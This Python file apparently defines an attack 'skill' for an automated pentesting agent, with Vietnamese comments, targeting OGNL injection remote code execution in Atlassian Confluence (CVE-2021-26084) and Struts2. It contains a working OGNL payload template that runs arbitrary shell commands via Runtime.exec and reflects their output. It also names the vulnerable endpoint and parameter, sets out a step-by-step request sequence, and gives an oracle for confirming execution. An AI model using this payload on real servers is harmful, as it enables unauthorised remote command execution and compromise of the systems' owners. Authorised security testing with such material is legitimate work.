"""Skill: OGNL injection RCE (Struts2 / Confluence). vuln_class = ognl-rce."""
from __future__ import annotations

from .base import Skill

# Template OGNL kiểu CVE-2021-26084/Confluence: chạy {CMD} qua Runtime.exec và phản chiếu output
# (kèm {NONCE} để oracle xác nhận tất định). Gửi trong param dễ tổn thương (vd queryString).
_CONFLUENCE_OGNL = (
    r"'%2b#{"
    r"@org.apache.commons.io.IOUtils@toString("
    r"@java.lang.Runtime@getRuntime().exec(new String[]{'/bin/sh','-c',"
    r"'echo {NONCE}; {CMD}'}).getInputStream())"
    r"}%2b'"
)

SKILL = Skill(
    vuln_class="ognl-rce",
    context=(
        "OGNL injection RCE (Struts2 S2-0xx / Atlassian Confluence). Điểm chèn thường là 1 param "
        "phản chiếu vào biểu thức OGNL (vd Confluence: POST /pages/doenterpagevariables.action, "
        "param `queryString`; Struts2: field `id` ở /index.action). Mục tiêu: chạy `id` và đọc lại "
        "`uid=` trong response. Dùng http_request (POST, Content-Type application/x-www-form-urlencoded) "
        "gửi payload OGNL chứa Runtime.exec; nếu server phản chiếu output → RCE."
    ),
    suggested_sequence=[
        "http_request GET / để xác nhận sản phẩm/version (banner)",
        "http_request POST endpoint OGNL với payload chạy `echo NONCE; id`",
        "kiểm tra response có NONCE + uid= (RCE tất định)",
    ],
    payload_templates=[
        "queryString=" + _CONFLUENCE_OGNL,
        # Struts2 dạng field id= (double-eval) — xem primitives.struts2_ognl_rce nếu cần bản đầy đủ.
        "id=%{(#cmd='{CMD}')...}  # dùng bản S2-061 ở primitives.py cho Struts2",
    ],
    oracle_hint="response chứa NONCE tự-inject và/hoặc chuỗi `uid=<n>(...)` từ lệnh id.",
)
